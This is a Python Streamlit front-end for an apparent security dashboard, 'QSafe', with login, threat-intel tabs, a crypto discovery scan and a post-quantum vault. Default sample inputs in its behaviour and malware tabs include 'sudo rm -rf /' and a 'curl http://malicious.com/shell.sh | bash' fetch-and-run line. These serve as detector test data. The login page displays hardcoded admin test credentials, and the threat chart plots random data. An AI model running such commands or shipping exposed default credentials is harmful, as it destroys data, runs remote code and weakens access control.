import streamlit as st
import requests
import os
import pandas as pd
import numpy as np
import time

# --- Configuration ---
API_BASE = os.getenv("API_BASE_URL", "http://localhost:8000")
LOGO_PATH = os.path.join(os.path.dirname(__file__), "assets", "logo.png")

st.set_page_config(
    page_title="QSafe Enterprise | Quantum-Safe Security",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# --- Enhanced Custom Styling (Ultra Premium) ---
st.markdown(f"""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
    
    :root {{
        --primary: #0ea5e9;
        --primary-glow: rgba(14, 165, 233, 0.4);
        --bg-dark: #020617;
        --card-bg: rgba(15, 23, 42, 0.6);
        --accent: #38bdf8;
    }}

    html, body, [class*="css"] {{
        font-family: 'Outfit', sans-serif;
        color: #f8fafc;
    }}
    
    .stApp {{
        background: radial-gradient(circle at top right, #1e293b, #020617);
        background-attachment: fixed;
    }}
    
    /* Glassmorphism Sidebar */
    [data-testid="stSidebar"] {{
        background: rgba(15, 23, 42, 0.8) !important;
        backdrop-filter: blur(15px);
        border-right: 1px solid rgba(255, 255, 255, 0.05);
    }}

    /* Premium Metric Cards */
    .metric-card {{
        background: var(--card-bg);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 16px;
        padding: 24px;
        backdrop-filter: blur(12px);
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        position: relative;
        overflow: hidden;
    }}
    
    .metric-card:hover {{
        transform: translateY(-5px);
        border-color: var(--primary);
        box-shadow: 0 10px 30px -10px var(--primary-glow);
    }}
    
    .metric-card::after {{
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle, var(--primary-glow) 0%, transparent 70%);
        opacity: 0;
        transition: opacity 0.3s;
    }}
    
    .metric-card:hover::after {{
        opacity: 0.1;
    }}

    .metric-value {{
        font-size: 2.5rem;
        font-weight: 700;
        background: linear-gradient(90deg, #38bdf8, #818cf8);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 4px;
    }}
    
    .metric-label {{
        font-size: 0.75rem;
        color: #94a3b8;
        text-transform: uppercase;
        letter-spacing: 0.15em;
        font-weight: 600;
    }}
    
    /* Tabs Styling */
    .stTabs [data-baseweb="tab-list"] {{
        gap: 24px;
        background: transparent;
    }}

    .stTabs [data-baseweb="tab"] {{
        height: 45px;
        background-color: transparent !important;
        border-radius: 8px !important;
        color: #94a3b8 !important;
        border: none !important;
        font-weight: 600 !important;
    }}

    .stTabs [aria-selected="true"] {{
        color: var(--primary) !important;
        background: rgba(14, 165, 233, 0.1) !important;
    }}

    /* Buttons */
    .stButton>button {{
        background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%) !important;
        color: white !important;
        border: none !important;
        border-radius: 10px !important;
        padding: 0.6rem 2.5rem !important;
        font-weight: 600 !important;
        text-transform: uppercase;
        letter-spacing: 0.05em;
        transition: all 0.4s !important;
        width: 100%;
    }}
    
    .stButton>button:hover {{
        box-shadow: 0 0 20px var(--primary-glow) !important;
        transform: scale(1.02) !important;
    }}

    /* Forms */
    .stForm {{
        background: rgba(15, 23, 42, 0.4) !important;
        border: 1px solid rgba(255, 255, 255, 0.05) !important;
        border-radius: 20px !important;
    }}

    /* Animations */
    @keyframes fadeIn {{
        from {{ opacity: 0; transform: translateY(10px); }}
        to {{ opacity: 1; transform: translateY(0); }}
    }}
    
    .fade-in {{
        animation: fadeIn 0.6s ease-out forwards;
    }}
    </style>
    """, unsafe_allow_html=True)

# --- Session State ---
if "token" not in st.session_state:
    st.session_state.token = None

# --- API Helpers ---
def login(email, password):
    try:
        resp = requests.post(f"{API_BASE}/auth/login", json={"email": email, "password": password})
        if resp.status_code == 200:
            st.session_state.token = resp.json()["access_token"]
            st.rerun()
        else:
            st.error("❌ Invalid credentials")
    except Exception as e:
        st.error(f"Connection Error: {str(e)}")

def register(email, password):
    try:
        resp = requests.post(f"{API_BASE}/auth/register", json={"email": email, "password": password})
        if resp.status_code == 200:
            st.success("✅ Registration successful!")
        else:
            st.error(f"❌ Registration failed: {resp.json().get('detail', 'Unknown error')}")
    except Exception as e:
        st.error(f"Connection Error: {str(e)}")

# --- Authentication UI ---
if not st.session_state.token:
    cols = st.columns([1, 1.5, 1])
    with cols[1]:
        st.image(LOGO_PATH, width=150)
        st.markdown("<h1 style='text-align: center; font-size: 3rem;'>QSafe</h1>", unsafe_allow_html=True)
        st.markdown("<p style='text-align: center; color: #94a3b8; margin-top: -20px;'>Quantum-Resilient Enterprise Security</p>", unsafe_allow_html=True)
        
        tab1, tab2 = st.tabs(["Secure Login", "Join the Frontier"])
        
        with tab1:
            with st.form("login_form"):
                u = st.text_input("Corporate ID", placeholder="admin@test.com")
                p = st.text_input("Access Key", type="password", placeholder="••••••••")
                if st.form_submit_button("Authenticate"):
                    login(u, p)
            st.markdown("<p style='text-align: center; font-size: 0.8rem; color: #475569;'>Test Creds: admin@test.com / admin123</p>", unsafe_allow_html=True)
                    
        with tab2:
            with st.form("register_form"):
                reg_u = st.text_input("Enterprise Email")
                reg_p = st.text_input("New Security Key", type="password")
                if st.form_submit_button("Initialize Account"):
                    register(reg_u, reg_p)

# --- Dashboard UI ---
else:
    # Sidebar
    with st.sidebar:
        st.image(LOGO_PATH, width=100)
        st.markdown("<h2 style='color: white; margin-top: 10px;'>QSafe Console</h2>", unsafe_allow_html=True)
        st.markdown("---")
        page = st.radio("OPERATIONAL HUB", ["Dashboard", "Threat Intel", "Discovery Scan", "AI Analyst", "Secure Vault"])
        st.markdown("---")
        st.caption("System Status: **OPTIMAL**")
        st.caption("Quantum Engine: **ACTIVE**")
        if st.button("TERMINATE SESSION"):
            st.session_state.token = None
            st.rerun()
    
    headers = {"Authorization": f"Bearer {st.session_state.token}"}

    if page == "Dashboard":
        st.markdown("<h1 class='fade-in'>📊 Security Operations Center</h1>", unsafe_allow_html=True)
        
        resp = requests.get(f"{API_BASE}/dashboard/metrics", headers=headers)
        if resp.status_code == 200:
            data = resp.json()
            
            # Premium Metric Cards
            m1, m2, m3, m4 = st.columns(4)
            with m1:
                st.markdown(f'<div class="metric-card"><div class="metric-value" style="background: linear-gradient(90deg, #4ade80, #2dd4bf); -webkit-background-clip: text;">{data["safety_score"]}%</div><div class="metric-label">Posture Score</div></div>', unsafe_allow_html=True)
            with m2:
                st.markdown(f'<div class="metric-card"><div class="metric-value" style="background: linear-gradient(90deg, #f87171, #fb7185); -webkit-background-clip: text;">{data["threat_alerts"]}</div><div class="metric-label">Active Threats</div></div>', unsafe_allow_html=True)
            with m3:
                st.markdown(f'<div class="metric-card"><div class="metric-value" style="background: linear-gradient(90deg, #fbbf24, #f59e0b); -webkit-background-clip: text;">{data["legacy_assets"]}</div><div class="metric-label">Legacy Debt</div></div>', unsafe_allow_html=True)
            with m4:
                st.markdown(f'<div class="metric-card"><div class="metric-value">{data["pqc_ready_assets"]}</div><div class="metric-label">PQC Enabled</div></div>', unsafe_allow_html=True)
            
            st.markdown("### 📈 Threat Vector Analysis")
            # Simulated Chart Data
            chart_data = pd.DataFrame(
                np.random.randn(20, 3) / [10, 20, 15] + [0.1, 0.2, 0.15],
                columns=['Infiltration', 'Exfiltration', 'Anomalies']
            )
            st.area_chart(chart_data, height=300)
            
            st.markdown("### 🛡️ Compliance Resilience")
            st.progress(data["compliance_score"] / 100, text=f"Resilience Index: {data['compliance_score']}%")
        else:
            st.error("Failed to connect to SOC Engine")

    elif page == "Threat Intel":
        st.markdown("<h1 class='fade-in'>🛡️ Real-time Threat Intelligence</h1>", unsafe_allow_html=True)
        
        # Real-time Stats from API
        resp = requests.get(f"{API_BASE}/threats/realtime-stats", headers=headers)
        if resp.status_code == 200:
            stats = resp.json()
            c1, c2, c3, c4 = st.columns(4)
            with c1: st.metric("Active Threats", stats["active_threats"], delta="-2", delta_color="inverse")
            with c2: st.metric("Anomalies", stats["anomalies_detected"], delta="5")
            with c3: st.metric("Malware Blocks", stats["malware_blocks"], delta="12")
            with c4: st.metric("AI Confidence", f"{stats['prediction_confidence']*100}%")

            st.markdown("### 🚨 Live Security Feed")
            for alert in stats["recent_alerts"]:
                st.markdown(f"""
                <div style="background: rgba(255,255,255,0.03); border-radius: 12px; padding: 15px; margin-bottom: 10px; border-left: 4px solid {'#f87171' if alert['severity'] == 'Critical' else '#fbbf24'};">
                    <span style="color: #94a3b8; font-size: 0.8rem;">{alert['time']}</span><br/>
                    <strong>{alert['event']}</strong><br/>
                    <small>Severity: {alert['severity']} | Engine: AI-Behavioral</small>
                </div>
                """, unsafe_allow_html=True)
        
        st.markdown("---")
        
        t1, t2, t3, t4 = st.tabs(["Log Analysis", "Behavior Tracking", "Malware Deep-Scan", "Predictive Defense"])
        
        with t1:
            st.markdown("#### Log Anomaly Detection")
            logs_input = st.text_area("Paste System Logs", "May 10 04:30:01 auth-svc: Failed login for admin from 192.168.1.50\nMay 10 04:31:05 net-svc: Unusual traffic spike on port 443", height=100)
            if st.button("EXECUTE ANALYSIS", key="logs_btn"):
                logs = [l.strip() for l in logs_input.split('\n') if l.strip()]
                resp = requests.post(f"{API_BASE}/threats/analyze-logs", json=logs, headers=headers)
                if resp.status_code == 200:
                    st.success("Analysis Complete")
                    st.write(resp.json()["anomalies"])
                
        with t2:
            st.markdown("#### Behavioral Heuristics")
            behavior_input = st.text_area("User Actions Stream", "user1: sudo rm -rf /\nuser2: curl http://malicious.com/shell.sh | bash", height=100)
            if st.button("SCAN BEHAVIOR", key="behav_btn"):
                behaviors = [b.strip() for b in behavior_input.split('\n') if b.strip()]
                resp = requests.post(f"{API_BASE}/threats/analyze-behavior", json=behaviors, headers=headers)
                if resp.status_code == 200:
                    st.warning("Suspicious Patterns Found")
                    st.write(resp.json()["suspicious_activities"])

        with t3:
            st.markdown("#### Malware & Ransomware Shield")
            processes = st.text_area("Process / I/O Stream", "powershell.exe -ExecutionPolicy Bypass\nEncrypting file: /data/db.sqlite", height=100)
            col_a, col_b = st.columns(2)
            with col_a:
                if st.button("MALWARE SCAN"):
                    proc_list = [p.strip() for p in processes.split('\n') if p.strip()]
                    resp = requests.post(f"{API_BASE}/threats/scan-malware", json=proc_list, headers=headers)
                    if resp.status_code == 200:
                        st.json(resp.json()["malware_indicators"])
            with col_b:
                if st.button("RANSOMWARE DETECT"):
                    proc_list = [p.strip() for p in processes.split('\n') if p.strip()]
                    resp = requests.post(f"{API_BASE}/threats/detect-ransomware", json=proc_list, headers=headers)
                    if resp.status_code == 200:
                        st.json(resp.json()["ransomware_behavior"])

        with t4:
            st.markdown("#### AI Attack Prediction")
            context = st.text_area("Environment Context", "Recent surge in failed SSH logins from multiple IPs. Public LB shows high latency.", height=100)
            if st.button("FORECAST ATTACKS"):
                with st.spinner("AI is calculating probabilities..."):
                    resp = requests.post(f"{API_BASE}/threats/predict", json={"context": context}, headers=headers)
                    if resp.status_code == 200:
                        data = resp.json()
                        st.info(f"**Forecasting Confidence:** {data['confidence_score']*100}%")
                        st.write(data["prediction"])

    elif page == "Discovery Scan":
        st.markdown("<h1 class='fade-in'>🔍 Quantum Discovery Engine</h1>", unsafe_allow_html=True)
        st.markdown("Analyze infrastructure for cryptographic technical debt.")
        path = st.text_input("Root Directory", "/app")
        if st.button("INITIALIZE DEEP SCAN"):
            with st.spinner("Analyzing cryptographic primitives..."):
                resp = requests.get(f"{API_BASE}/discovery/scan", params={"path": path}, headers=headers)
                if resp.status_code == 200:
                    data = resp.json()
                    st.success("Vulnerability Analysis Complete")
                    st.json(data)

    elif page == "AI Analyst":
        st.markdown("<h1 class='fade-in'>🤖 Agentic Analyst</h1>", unsafe_allow_html=True)
        event = st.text_area("Security Event for Analysis", height=200, placeholder="Example: Unauthorized database access attempt...")
        if st.button("CONSULT AGENT"):
            with st.spinner("Agent processing threat intelligence..."):
                resp = requests.post(f"{API_BASE}/agents/analyze", json={"event": event}, headers=headers)
                if resp.status_code == 200:
                    st.markdown("---")
                    st.markdown("### 📋 Remediation Strategy")
                    st.write(resp.json()["analysis"])

    elif page == "Secure Vault":
        st.markdown("<h1 class='fade-in'>🗄️ Post-Quantum Vault</h1>", unsafe_allow_html=True)
        st.markdown("Hybrid-Classical encryption (Kyber-768 + AES-256).")
        
        t_v1, t_v2 = st.tabs(["Secure Storage", "Key Management"])
        
        with t_v1:
            secret = st.text_input("Data to Protect", placeholder="Enter sensitive info...")
            if st.button("LOCK & STORE"):
                resp = requests.post(f"{API_BASE}/vault/store", json={"data": secret}, headers=headers)
                if resp.status_code == 200:
                    st.success("Encrypted and secured in PQC Vault")
                    st.json(resp.json())
        
        with t_v2:
            if st.button("ROTATE KYBER KEYS"):
                resp = requests.get(f"{API_BASE}/vault/keys/kyber", headers=headers)
                if resp.status_code == 200:
                    st.success("New PQC Keypair Generated")
                    st.json(resp.json())
